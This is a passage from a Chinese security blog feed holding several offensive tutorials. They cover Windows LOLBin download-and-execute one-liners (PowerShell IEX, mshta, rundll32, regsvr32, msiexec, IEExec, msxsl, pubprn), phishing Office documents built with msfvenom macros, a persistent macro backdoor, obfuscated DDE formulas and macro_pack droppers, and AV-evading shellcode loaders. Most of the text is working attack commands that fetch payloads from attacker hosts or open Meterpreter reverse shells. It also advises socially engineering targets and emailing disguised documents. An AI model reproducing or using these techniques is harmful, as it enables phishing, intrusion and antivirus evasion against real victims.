class="hljs-params">(<span class="hljs-string">&#x27;http://192.168.43.127/payload.txt&#x27;</span>,<span class="hljs-string">&#x27;evil.txt&#x27;</span>)</span></span></code></pre><h3 id="2-远程执行命令，无文件落地"><a href="#2-远程执行命令，无文件落地" class="headerlink" title="2.远程执行命令，无文件落地"></a>2.远程执行命令，无文件落地</h3><p><code>powershell -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;payload地址&#39;))&quot;</code></p><h2 id="8-ipc-文件共享"><a href="#8-ipc-文件共享" class="headerlink" title="8.ipc$文件共享"></a>8.ipc$文件共享</h2><p>IPC$(Internet Process Connection)是共享”命名管道”的资源，它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。（此时关闭了PHP study）</p><p>建立远程IPC连接:<code>net use \\目标ip\ipc$ /user:administrator &quot;密码&quot; </code> (注意是管理员)<br>复制远程文件到本地主机:<code>copy \\目标ip\c$\payload payload落地地址 </code></p><p>查看目标机器是否开启IPC服务<code>net share</code></p><pre><code class="hljs shell">C:\Users\haha&gt;net share共享名       资源                            注解-------------------------------------------------------------------------------<span class="hljs-meta">C$</span><span class="bash">           C:\                             默认共享</span><span class="hljs-meta">IPC$</span><span class="bash">                                         远程 IPC</span><span class="hljs-meta">ADMIN$</span><span class="bash">       C:\Windows                      远程管理</span>命令成功完成。C:\Users\haha&gt;</code></pre><h2 id="9-ftp"><a href="#9-ftp" class="headerlink" title="9.ftp"></a>9.ftp</h2><p>一般情况下攻击者使用FTP上传文件需要很多交互的步骤，下面这个 bash脚本，考虑到了交互的情况，可以直接执行并不会产生交互动作。</p><p><code>ftp 127.0.0.1</code></p><p><code>username</code></p><p><code>password</code></p><p><code>get payload</code></p><p><code>exit</code></p><h2 id="10-TFTP"><a href="#10-TFTP" class="headerlink" title="10.TFTP"></a>10.TFTP</h2><p>用来下载远程文件的最简单的网络协议，它基于UDP协议而实现</p><p>tftp32服务端下载地址：<a href="http://tftpd32.jounin.net/tftpd32_download.html">http://tftpd32.jounin.net/tftpd32_download.html</a></p><p><code>tftp -i vps-IP get payload 存放位置</code></p><h2 id="11-WinScp"><a href="#11-WinScp" class="headerlink" title="11.WinScp"></a>11.WinScp</h2><p>WinSCP是一个Windows环境下使用SSH的开源图形化SFTP客户端。</p><p>上传文件：<code>winscp.exe /console /command &quot;option batch continue&quot; &quot;option confirm off&quot; &quot;open sftp://账户:密码@192.168.43.127:22&quot; &quot;option transfer binary&quot; &quot;put D:\1.txt /tmp/&quot; &quot;exit&quot; /log=log_file.txt </code></p><p>下载文件：<code>winscp.exe /console /command &quot;option batch continue&quot; &quot;option confirm off&quot; &quot;open sftp://账户:密码@192.168.43.127:22&quot; &quot;option transfer binary&quot; &quot;get /tmp D:\test\app\&quot; &quot;exit&quot; /log=log_file.txt</code></p><h2 id="12-msiexec"><a href="#12-msiexec" class="headerlink" title="12.msiexec"></a>12.msiexec</h2><p>msiexec 支持远程下载功能，将msi文件上传到服务器，通过如下命令远程执行：</p><pre><code class="hljs jboss-cli"><span class="hljs-comment">#生成msi包</span>msfvenom -p windows/exec CMD=&#x27;net user test abc123! <span class="hljs-string">/add</span>&#x27; -f msi &gt; evil.msi<span class="hljs-comment">#远程执行添加一个test用户</span>msiexec <span class="hljs-string">/q</span> <span class="hljs-string">/i</span> http:<span class="hljs-string">//192.168.43.127/evil.msi</span></code></pre><h2 id="13-IEExec"><a href="#13-IEExec" class="headerlink" title="13.IEExec"></a>13.IEExec</h2><p>IEexec.exe应用程序是.NET Framework附带程序，存在于多个系统白名单内。</p><p>生成Payload：</p><pre><code class="hljs shell">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.28.131 lport=3333 -f exe -o evil.exe</code></pre><p>使用管理员身份打开cmd，分别运行下面两条命令。</p><pre><code class="hljs apache"><span class="hljs-attribute">C</span>:\Windows\Microsoft.NET\Framework<span class="hljs-number">64</span>\v<span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-number">50727</span>&gt;caspol.exe -s <span class="hljs-literal">off</span><span class="hljs-attribute">C</span>:\Windows\Microsoft.NET\Framework<span class="hljs-number">64</span>\v<span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-number">50727</span>&gt;IEExec.exe http://<span class="hljs-number">192.168.43.127</span>/evil.exe</code></pre><h2 id="14-mshta"><a href="#14-mshta" class="headerlink" title="14.mshta"></a>14.mshta</h2><p>mshta用于执行.hta文件，而hta是HTML Applocation 的缩写，也就是HTML应用程序。而hta中也支持VBS。所以我们可以利用hta来下载文件。</p><p><code>mshta http://192.168.43.127/payload.hta</code></p><p>payload.hta内容如下</p><pre><code class="hljs stata"><span class="hljs-keyword">Window</span>.ReSizeTo 0, 0<span class="hljs-keyword">Window</span>.moveTo -2000,-2000<span class="hljs-keyword">Set</span> objShell = CreateObject(<span class="hljs-string">&quot;Wscript.Shell&quot;</span>)objShell.<span class="hljs-keyword">Run</span> <span class="hljs-string">&quot;cmd.exe /c net user test password /add&quot;</span> <span class="hljs-comment">// 这里填写命令</span>self.<span class="hljs-keyword">close</span>demo</code></pre><h2 id="15-rundll32"><a href="#15-rundll32" class="headerlink" title="15.rundll32"></a>15.rundll32</h2><p>其实还是依赖于WScript.shell这个组件，在这里我们使用JSRat来做演示，JSRat是一个命令和控制框架，仅为rundll32.exe和regsvr32.exe生成恶意程序。</p><p>项目地址：<a href="https://github.com/Hood3dRob1n/JSRat-Py.git">https://github.com/Hood3dRob1n/JSRat-Py.git</a></p><p>步骤一，开始运行JSRat，监听本地8888端口：<code>./JSRat.py -i 192.168.43.30 -p 3333</code></p><p>步骤二：通过url访问，可以查看恶意代码。复制代码如下：</p><pre><code class="hljs reasonml">rundll32.exe javascript:<span class="hljs-string">&quot;\..\mshtml,RunHTMLApplication &quot;</span>;document.write<span class="hljs-literal">()</span>;h=<span class="hljs-keyword">new</span>%<span class="hljs-number">20</span><span class="hljs-constructor">ActiveXObject(<span class="hljs-string">&quot;WinHttp.WinHttpRequest.5.1&quot;</span>)</span>;h.<span class="hljs-constructor">Open(<span class="hljs-string">&quot;GET&quot;</span>,<span class="hljs-string">&quot;http://192.168.43.30:3333/connect&quot;</span>,<span class="hljs-params">false</span>)</span>;<span class="hljs-keyword">try</span>&#123;h.<span class="hljs-constructor">Send()</span>;b=h.ResponseText;eval(b);&#125;catch(e)&#123;<span class="hljs-keyword">new</span>%<span class="hljs-number">20</span><span class="hljs-constructor">ActiveXObject(<span class="hljs-string">&quot;WScript.Shell&quot;</span>)</span>.<span class="hljs-constructor">Run(<span class="hljs-string">&quot;cmd /c taskkill /f /im rundll32.exe&quot;</span>,0,<span class="hljs-params">true</span>)</span>;&#125;</code></pre><p>步骤三：在受害者PC运行该代码，将成功返回一个会话</p><h2 id="16-regsvr32"><a href="#16-regsvr32" class="headerlink" title="16.regsvr32"></a>16.regsvr32</h2><p>Regsvr32命令用于注册COM组件，是Windows系统提供的用来向系统注册控件或者卸载控件的命令，以命令行方式运行</p><p>在目标机上执行：<code>regsvr32.exe /u /n /s /i:http://192.168.43.127/file.sct scrobj.dll</code></p><p>可以通过自己构造file.sct文件，去下载执行我们的程序，例如执行以下命令，成功弹计算器。（本次机器未复现成功）</p><pre><code class="hljs routeros">&lt;?XML <span class="hljs-attribute">version</span>=<span class="hljs-string">&quot;1.0&quot;</span>?&gt; <span class="hljs-attribute">progid</span>=<span class="hljs-string">&quot;ShortJSRAT&quot;</span>    <span class="hljs-attribute">classid</span>=<span class="hljs-string">&quot;&#123;10001111-0000-0000-0000-0000FEEDACDC&#125;&quot;</span> &gt;     ps  = <span class="hljs-string">&quot;cmd.exe /c calc.exe&quot;</span>;        new ActiveXObject(<span class="hljs-string">&quot;WScript.Shell&quot;</span>).<span class="hljs-builtin-name">Run</span>(ps,0,<span class="hljs-literal">true</span>);      ]]&gt;</code></pre><h2 id="17-MSXSL-EXE"><a href="#17-MSXSL-EXE" class="headerlink" title="17.MSXSL.EXE"></a>17.MSXSL.EXE</h2><p>msxsl.exe是微软用于命令行下处理XSL的一个程序，所以通过他，我们可以执行JavaScript进而执行系统命令。</p><p>下载地址为：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=21714">https://www.microsoft.com/en-us/download/details.aspx?id=21714</a></p><p>msxsl.exe 需要接受两个文件，XML及XSL文件，可以远程加载，具体方式如下可弹出计算器：</p><pre><code class="hljs awk">msxsl http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">28.128</span><span class="hljs-regexp">/scripts/</span>demo.xml http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">43.127</span><span class="hljs-regexp">/scripts/</span>exec.xsl</code></pre><p>demo.xml</p><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span><span class="hljs-meta">&lt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;exec.xsl&quot; ?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">customers</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">customer</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>Microsoftname&gt;customer&gt;customers&gt;</code></pre><p>exec.xsl</p><pre><code class="hljs pgsql">&lt;?<span class="hljs-type">xml</span> version=<span class="hljs-string">&#x27;1.0&#x27;</span>?&gt;&lt;xsl:stylesheet version=&quot;1.0&quot;xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;xmlns:msxsl=&quot;urn:schemas-microsoft-com:xslt&quot;xmlns:<span class="hljs-keyword">user</span>=&quot;http://mycompany.com/mynamespace&quot;&gt;&lt;msxsl:script <span class="hljs-keyword">language</span>=&quot;JScript&quot; implements-prefix=&quot;user&quot;&gt;<span class="hljs-keyword">function</span> <span class="hljs-type">xml</span>(nodelist) &#123;var r = <span class="hljs-built_in">new</span> ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c calc.exe&quot;);<span class="hljs-keyword">return</span> nodelist.nextNode().xml;   &#125;msxsl:script&gt;&lt;xsl:<span class="hljs-keyword">template</span> match=&quot;/&quot;&gt;   &lt;xsl:<span class="hljs-keyword">value</span>-<span class="hljs-keyword">of</span> <span class="hljs-keyword">select</span>=&quot;user:xml(.)&quot;/&gt;xsl:<span class="hljs-keyword">template</span>&gt;xsl:stylesheet&gt;</code></pre><h2 id="18-pubprn-vbs"><a href="#18-pubprn-vbs" class="headerlink" title="18.pubprn.vbs"></a>18.pubprn.vbs</h2><p>在Windows 7以上版本存在一个名为PubPrn.vbs的微软已签名WSH脚本，其位于<code>C:\Windows\System32\Printing_Admin_Scripts\en-US</code>，仔细观察该脚本可以发现其显然是由用户提供输入(通过命令行参数)，之后再将参数传递给GetObject()</p><p>在目标机器上执行以下命令会弹出计算器</p><pre><code class="hljs latex">cd C:<span class="hljs-tag">\<span class="hljs-name">Windows</span></span><span class="hljs-tag">\<span class="hljs-name">System</span></span>32<span class="hljs-tag">\<span class="hljs-name">Printing</span></span>_Admin_Scripts<span class="hljs-tag">\<span class="hljs-name">zh</span></span>-CN<span class="hljs-tag">\<span class="hljs-name"> </span></span> #en-USC:<span class="hljs-tag">\<span class="hljs-name">Windows</span></span><span class="hljs-tag">\<span class="hljs-name">System</span></span>32<span class="hljs-tag">\<span class="hljs-name">Printing</span></span>_Admin_Scripts<span class="hljs-tag">\<span class="hljs-name">zh</span></span>-CN&gt;pubprn.vbs&quot; 127.0.0.1 script:http//192.168.43.30/test.sct</code></pre><p>test.sct</p><pre><code class="hljs dust"><span class="xml"><span class="hljs-meta">&lt;?XML version=&quot;1.0&quot;?&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">scriptlet</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">registration</span></span></span><span class="xml">    description=&quot;Bandit&quot;</span><span class="xml">    progid=&quot;Bandit&quot;</span><span class="xml">    version=&quot;1.00&quot;</span><span class="xml">    classid=&quot;</span><span class="hljs-template-variable">&#123;AAAA1111-0000-0000-0000-0000FEEDACDC&#125;</span><span class="xml">&quot;</span><span class="xml">    remotable=&quot;true&quot;</span><span class="xml">    &gt;</span><span class="xml">registration&gt;</span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;JScript&quot;</span>&gt;</span></span><span class="xml">        var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc.exe&quot;);</span><span class="xml">]]&gt;</span><span class="xml">script&gt;</span><span class="xml">scriptlet&gt;</span></code></pre><p>参考：<a href="https://blog.csdn.net/weixin_36303045/article/details/112490857">https://blog.csdn.net/weixin_36303045/article/details/112490857</a></p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vbs</tag>
      
      <tag>certutil</tag>
      
      <tag>bitsadmin</tag>
      
      <tag>js</tag>
      
      <tag>wget</tag>
      
      <tag>curl</tag>
      
      <tag>powershell</tag>
      
      <tag>ipc$文件共享</tag>
      
      <tag>ftp</tag>
      
      <tag>tftp</tag>
      
      <tag>winscp</tag>
      
      <tag>msiexec</tag>
      
      <tag>IEExec</tag>
      
      <tag>mshta</tag>
      
      <tag>rundll32</tag>
      
      <tag>regsvr32</tag>
      
      <tag>MSXSL.EXE</tag>
      
      <tag>pubprn.vbs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>免杀文档制作</title>
    <link href="/2020/10/05/%E5%85%8D%E6%9D%80%E6%96%87%E6%A1%A3%E5%88%B6%E4%BD%9C/"/>
    <url>/2020/10/05/%E5%85%8D%E6%9D%80%E6%96%87%E6%A1%A3%E5%88%B6%E4%BD%9C/</url>
    
    <content type="html"><![CDATA[<p>本文主要介绍一些钓鱼文档的制作方法。</p><a id="more"></a><h2 id="1-office宏攻击"><a href="#1-office宏攻击" class="headerlink" title="1.office宏攻击"></a>1.office宏攻击</h2><p>宏是微软公司为其OFFICE软件包设计的一个特殊功能，有着独特的文件后缀名，如：xlsm，docm，pptm等。</p><p>office：2016教育版</p><p>攻击机：kali 192.168.43.30</p><h3 id="1-msf生成payload"><a href="#1-msf生成payload" class="headerlink" title="1.msf生成payload"></a>1.msf生成payload</h3><p>1.先msf生成一段payload</p><pre><code class="hljs shell">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.43.30 LPORT=3333 -f vba -o shell.vba</code></pre><p>2.新建一个启用宏的office文档。</p><p><img src="/2020/10/05/%E5%85%8D%E6%9D%80%E6%96%87%E6%A1%A3%E5%88%B6%E4%BD%9C/1.png" alt="image-20210128001528982"></p><p>3.然后点击并勾选：文件-选项-自定义功能区-开发工具。</p><p>4.点击宏</p><p><img src="/2020/10/05/%E5%85%8D%E6%9D%80%E6%96%87%E6%A1%A3%E5%88%B6%E4%BD%9C/image-20210128001945054.png" alt="image-20210128001945054"></p><p>5.创建一个新的文件宏，注意宏名只能为字母或汉字，不能为数字；选择宏的位置为第一步新建的启用宏的office文档的名字</p><p><img src="/2020/10/05/%E5%85%8D%E6%9D%80%E6%96%87%E6%A1%A3%E5%88%B6%E4%BD%9C/image-20210128000409133.png" alt="image-20210128000409133"></p><p>6.将文本框里的代码全部替换为msf生成宏代码，Ctrl+s，关闭文本框，Ctrl+s，退出。</p><p>7.在靶机里打开office文档，启用宏，msf上线。</p><p><img src="/2020/10/05/%E5%85%8D%E6%9D%80%E6%96%87%E6%A1%A3%E5%88%B6%E4%BD%9C/image-20210128000509782.png" alt="image-20210128000509782"></p><h3 id="2-cs生成payload"><a href="#2-cs生成payload" class="headerlink" title="2.cs生成payload"></a>2.cs生成payload</h3><p>步骤和msf生成payload制作木马一样，只不过需要将msf的木马替换为cs的MS Office Macro的马。</p><p><img src="/2020/10/05/%E5%85%8D%E6%9D%80%E6%96%87%E6%A1%A3%E5%88%B6%E4%BD%9C/image-20210128001050461.png" alt="image-20210128001050461"></p><h3 id="3-建立全局宏持久性后门"><a href="#3-建立全局宏持久性后门" class="headerlink" title="3.建立全局宏持久性后门"></a>3.建立全局宏持久性后门</h3><p>office宏除了用于钓鱼，还可以用来建立隐蔽的持久性后门。新建一个宏，位置要选择所有活动模版和文档。</p><p><img src="/2020/10/05/%E5%85%8D%E6%9D%80%E6%96%87%E6%A1%A3%E5%88%B6%E4%BD%9C/image-20210128003712029.png" alt="image-20210128003712029"></p><p>在ThisDocument中写入宏代码，进行保存。</p><p><img src="/2020/10/05/%E5%85%8D%E6%9D%80%E6%96%87%E6%A1%A3%E5%88%B6%E4%BD%9C/image-20210128003907554.png" alt="image-20210128003907554"></p><p>成功建立了一个隐藏持久性后门，打开任意文档都可以触发宏代码。</p><h3 id="4-文件图标替换"><a href="#4-文件图标替换" class="headerlink" title="4.文件图标替换"></a>4.文件图标替换</h3><p>生成宏的文档和正常的文档图标不一样</p><p><img src="/2020/10/05/%E5%85%8D%E6%9D%80%E6%96%87%E6%A1%A3%E5%88%B6%E4%BD%9C/image-20210128005843267.png" alt="image-20210128005843267"></p><p>还没找到可以替换文档图片的方法，，，不过知道替换exe图片的一个软件：Restorator</p><h3 id="5-缺点"><a href="#5-缺点" class="headerlink" title="5.缺点"></a>5.缺点</h3><p>类似office宏还有一些其它利用方式，如DOCX文档远程模板注入执行宏，还可以通过shellcode进行免杀处理。在实战中，首先尽可能社工目标的各种信息，取得对方信任，根据钓鱼的目标，修改文档的名字，通过邮箱进行发送，如xx公司采购说明。</p><p>office宏钓鱼存在几大不适用性：</p><p>1、对方电脑未使用office。</p><p>2、office默认禁用宏，打开文件会进行提示。</p><p>3、独特的宏文件后缀，docm，xlsm等，容易引起他人怀疑。</p><p>4、免杀性要求较高。</p><h2 id="2-DDE"><a href="#2-DDE" class="headerlink" title="2.DDE"></a>2.DDE</h2><p>动态数据交换（DDE），它是在Microsoft Windows操作系统中实现的客户端/服务器通信方法。</p><p>在开源的openoffice中可以直接调用DDE函数，像=DDE(“cmd”;”/C calc”;”123”)这样调用。</p><p>而在正规的office套件中则移除了DDE函数，但是我们还是可以使用application|topic!item这一格式的三元表达式调用DDE。注意：该方法的提示窗口只提示application而不提示topic。</p><p>一些特性：</p><p>1、当excel遇到+和-会自动填充=成为公式，如</p><pre><code class="hljs dockerfile">+thespnquisition(<span class="hljs-keyword">cmd</span><span class="bash">|<span class="hljs-string">&#x27;/c calc.exe&#x27;</span>!A</span></code></pre><p>2、若打开的外部应用为8字符，excel自动忽略后面的字符，如下面的两个作用相同：</p><pre><code class="hljs excel">=rundll32|&#x27;URL.dll,OpenURL calc.exe&#x27;!A=rundll321234567890abcdefghijklmnopqrstuvwxyz|&#x27;URL.dll,OpenURL calc.exe&#x27;!A</code></pre><p>3、将其他表达式或空格填充在恶意表达式之前</p><pre><code class="hljs excel">=AA+BB-CC&amp;<span class="hljs-string">&quot;Hello&quot;</span>/<span class="hljs-number">12345</span>&amp;cmd|&#x27;/c calc.exe&#x27;!A</code></pre><p>4、通过windows batch的语法特性，填充无意义或是不影响执行逻辑的字符和指令，将topic字段混淆，如以下payload：</p><pre><code class="hljs parser3"><span class="xml">=cmd|&#x27;/c REM.&amp;&amp;@p</span><span class="hljs-keyword">^o</span><span class="hljs-keyword">^w</span><span class="hljs-keyword">^e</span><span class="hljs-keyword">^r</span><span class="hljs-keyword">^s</span><span class="hljs-keyword">^h</span><span class="hljs-keyword">^e</span><span class="hljs-keyword">^l</span><span class="hljs-keyword">^l</span><span class="xml"> c:/*/*</span><span class="hljs-number">2</span><span class="xml">/?al?.?x?&quot;&#x27;!_xlbgnm.A1</span><span class="hljs-comment">#/c 是cmd参数，表示执行后关闭窗口</span><span class="hljs-comment">#REM 示后面的内容是注释</span><span class="hljs-comment">#. 表示空行，用于终止之前的REM</span><span class="hljs-comment">#&amp;&amp; 表示如果前一条指令执行成功则执行后一条指令</span><span class="hljs-comment">#@ 表示执行窗口不显示后面的命令</span><span class="hljs-comment">#^ 表示转义，此处无实际意义，只是用来混淆powershell这一敏感词</span><span class="hljs-comment">#? 表示powershell通配符，其中匹配任意字符串，?匹配1个字符，此处能唯一定位到c:/windows/system32/calc.exe</span><span class="hljs-comment">#“ 无实际用途，删了也没啥区别</span></code></pre><p>所以经过解析后，实际执行的命令是:</p><pre><code class="hljs awk">cmd.exe<span class="hljs-regexp">/c powershell c:/</span>windows<span class="hljs-regexp">/system32/</span>calc.exe</code></pre><p>当然，也可以使用字符串拼接的特性，将命令变为下面这样：</p><pre><code class="hljs excel">=MSEXCEL|&#x27;\..\..\..\Windows\System32\cmd.exe /c REM.&amp;&amp;@p^o^w^e^r^s^h^e^l^l <span class="hljs-symbol">c:</span>/*/*<span class="hljs-number">2</span>/?al?.?x?<span class="hljs-string">&quot;&#x27;!_xlbgnm.A1</span></code></pre><p>msf也集成了这种攻击方式</p><pre><code class="hljs awk">use exploit<span class="hljs-regexp">/windows/</span>fileformat/office_dde_delivery</code></pre><h2 id="3-power-query-DDE"><a href="#3-power-query-DDE" class="headerlink" title="3.power query DDE"></a>3.power query DDE</h2><p>如其名,DDE的一种。Power Query是微软Excel中一个强大的工具，利用该工具的漏洞可以远程执行嵌入的恶意payload。</p><p>Power Query ：<a href="https://support.microsoft.com/zh-cn/office/power-query-%E5%85%A5%E9%97%A8-7104fbee-9e62-4cb9-a02e-5bfb1a6c536a">https://support.microsoft.com/zh-cn/office/power-query-%E5%85%A5%E9%97%A8-7104fbee-9e62-4cb9-a02e-5bfb1a6c536a</a></p><p>Power Query特征可以使攻击者很容易并动态地嵌入远程内容。这种攻击很难检测，而且攻击者有更多的机会来入侵受害者机器。利用Power Query中的潜在漏洞，攻击者可以将恶意内容嵌入到payload中，但恶意内容本身并不会下载。</p><p><a href="https://xz.aliyun.com/t/5514">https://xz.aliyun.com/t/5514</a></p><h2 id="4-DDE-宏-lolbin"><a href="#4-DDE-宏-lolbin" class="headerlink" title="4.DDE + 宏+lolbin"></a>4.DDE + 宏+lolbin</h2><p>具体的思路如下：使用宏远程下载一个hta文件，然后依靠dde加载该hta，hta为一个启动mshta的恶意程序。</p><p>首先，我们要建立一个使用宏远程下载的excel文件，如果会vbs的话可以自己进行编写，如果不会的话可以使用macro_pack进行辅助</p><p>macro_pack：<a href="https://github.com/sevagas/macro_pack">https://github.com/sevagas/macro_pack</a></p><p>macro_pack windows程序：<a href="https://github.com/sevagas/macro_pack/releases/">https://github.com/sevagas/macro_pack/releases/</a></p><p>我们的目的是使用它生成一个具有下载功能的excel。我们可以使用下面的方法进行生成：</p><pre><code class="hljs vala">echo <span class="hljs-string">&quot;https://myurl.url/payload.exe&quot;</span> <span class="hljs-string">&quot;dropped.exe&quot;</span> |  macro_pack.exe -t DROPPER -G <span class="hljs-string">&quot;drop.xls&quot;</span><span class="hljs-meta">#https://myurl.url/payload.exe：恶意程序的地址</span><span class="hljs-meta">#dropped.exe：恶意程序下载下来保存的文件名</span><span class="hljs-meta">#drop.xls：生成的excel表格名</span></code></pre><p>打开drop.xls，启用宏，就会自动下载url的payload.exe,并保存为dropped.exe，然后执行，msf上线。</p><p>但是我们要做到免杀，就不要求它进行执行，所以需要对宏代码做一定的修改：</p><p><img src="/2020/10/05/%E5%85%8D%E6%9D%80%E6%96%87%E6%A1%A3%E5%88%B6%E4%BD%9C/image-20210129015545405.png" alt="image-20210129015545405"></p><p>将里面的ExecuteCmdAsync downloadPath给删除掉，并删除其构造代码，然后更改下载路径为你自己想要的路径，服务器地址为你的地址即可。</p><p>然后我们此时打开该文档，就会提示我们运行宏，我们允许，则会在我们刚才设置的地方下载好我们的hta文件。然后我们将宏代码保存为vba文件，使用下面的命令将其混淆：</p><pre><code class="hljs css"><span class="hljs-selector-tag">macro_pack</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">-f</span> <span class="hljs-selector-tag">xxx</span><span class="hljs-selector-class">.vba</span> <span class="hljs-selector-tag">-o</span> <span class="hljs-selector-tag">-G</span> <span class="hljs-selector-tag">xxx</span><span class="hljs-selector-class">.xls</span></code></pre><p>然后将宏代码保存为vba文件，使用下面的命令将其混淆：</p><pre><code class="hljs css"><span class="hljs-selector-tag">macro_pack</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">-f</span> <span class="hljs-selector-tag">xxx</span><span class="hljs-selector-class">.vba</span> <span class="hljs-selector-tag">-o</span> <span class="hljs-selector-tag">-G</span> <span class="hljs-selector-tag">xxx</span><span class="hljs-selector-class">.xls</span></code></pre><p>然后我们下面就需要调用我们的hta文件了。我们说过了，要使用dde，我们这里就使用dde去调用rundll32.exe去运行我们的hta文件：</p><pre><code class="hljs excel">=MSEXCEL|&#x27;\..\..\..\Windows\System32\rundll32.exe url.dll,FileProtocolHandler  <span class="hljs-symbol">c:</span>\temp\payload.hta&#x27;!_xlbgnm.<span class="hljs-symbol">A1</span></code></pre><p><img src="/2020/10/05/%E5%85%8D%E6%9D%80%E6%96%87%E6%A1%A3%E5%88%B6%E4%BD%9C/image-20210129021101468.png" alt="image-20210129021101468"></p><p>有关rundll32具体信息请访问：<a href="https://support.microsoft.com/sk-sk/help/164787/info-windows-rundll-and-rundll32-interface">https://support.microsoft.com/sk-sk/help/164787/info-windows-rundll-and-rundll32-interface</a></p><p>比如当前我们的hta内容如下，那么将执行内部代码弹出计算器.</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">HTML</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">HEAD</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;VBScript&quot;</span>&gt;</span>Window.ReSizeTo 0, 0Window.moveTo -2000,-2000<span class="javascript"><span class="hljs-built_in">Set</span> objShell = CreateObject(<span class="hljs-string">&quot;Wscript.Shell&quot;</span>)</span><span class="javascript">objShell.Run <span class="hljs-string">&quot;calc.exe&quot;</span></span>self.close<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">HEAD</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">HTML</span>&gt;</span></code></pre><p>但是，仅仅这样还是不够的我们还需要其他的，我们接下来再使用攻击中常见的一种手法，mshta攻击，用法如下：</p><pre><code class="hljs css"><span class="hljs-selector-tag">mshta</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">payload</span>地址</code></pre><p>首先使用msf开启监听，然后将这里：</p><pre><code class="hljs routeros"><span class="hljs-builtin-name">Set</span> objShell = CreateObject(<span class="hljs-string">&quot;Wscript.Shell&quot;</span>)objShell.<span class="hljs-builtin-name">Run</span> <span class="hljs-string">&quot;calc.exe&quot;</span></code></pre><p>改成mshta的利用语句并混淆，目标运行，成功上线：</p><p><a href="https://lengjibo.github.io/execl/">https://lengjibo.github.io/execl/</a></p><p><a href="https://mp.weixin.qq.com/s/lhg71lVHfp9PY1m8sYXA_A">https://mp.weixin.qq.com/s/lhg71lVHfp9PY1m8sYXA_A</a></p><p>  <a href="https://app.any.run/submissions">https://app.any.run/submissions</a> </p><p><a href="https://www.freebuf.com/articles/network/170074.html">https://www.freebuf.com/articles/network/170074.html</a></p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>office宏攻击 </tag>
      
      <tag>DDE</tag>
      
      <tag>power query DDE</tag>
      
      <tag>DDE + 宏+lolbin</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>免杀二-脚本语言免杀</title>
    <link href="/2020/10/04/%E5%85%8D%E6%9D%80%E4%BA%8C-%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%E5%85%8D%E6%9D%80/"/>
    <url>/2020/10/04/%E5%85%8D%E6%9D%80%E4%BA%8C-%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%E5%85%8D%E6%9D%80/</url>
    
    <content type="html"><![CDATA[<p>本文介绍C/C++、python、C#、powershell、go五种语言的常见的免杀方法</p><a id="more"></a><h2 id="1-c-c"><a href="#1-c-c" class="headerlink" title="1.c/c++"></a>1.c/c++</h2><h3 id="1-源码编译（VT-24-70，过360和微软）"><a href="#1-源码编译（VT-24-70，过360和微软）" class="headerlink" title="1.源码编译（VT:24/70，过360和微软）"></a>1.源码编译（VT:24/70，过360和微软）</h3><h4 id="1-指针执行"><a href="#1-指针执行" class="headerlink" title="1.指针执行"></a>1.指针执行</h4><p>msf生成shellcode</p><pre><code class="hljs shell">msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b &#x27;\x00&#x27; lhost=192.168.3.28 lport=3333  -f c -o shell.c</code></pre><p>vs2019编译生成的shellcode</p><pre><code class="hljs shell">unsigned char buf[] =&quot;shellcode&quot;;<span class="hljs-meta">  #</span><span class="bash">pragma comment(linker, <span class="hljs-string">&quot;/section:.data,RWE&quot;</span>)</span>    main()    &#123;        ( (void(*)(void))&amp;buf)();    &#125;</code></pre><p>在vs中选择debug，生成-生成project，生成的文件在debug目录下。</p><p>运行生成的exe，msf设置上线即可</p><pre><code class="hljs shell">use multi/handlerset payload windows/meterpreter/reverse_tcpset LHOST 192.168.3.30set LPORT 